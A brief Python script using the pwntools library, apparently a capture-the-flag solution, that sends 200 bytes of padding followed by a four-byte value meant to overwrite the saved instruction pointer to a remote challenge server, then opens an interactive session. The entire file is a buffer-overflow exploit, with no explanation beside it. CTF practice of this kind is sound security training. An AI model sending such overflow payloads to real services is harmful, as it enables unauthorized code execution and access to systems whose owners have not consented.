from pwn import *

buffer = b"A" * 200
eip = b"EEAA"

s = remote("0.cloud.chals.io", 21911)
s.send(buffer + eip)
s.interactive()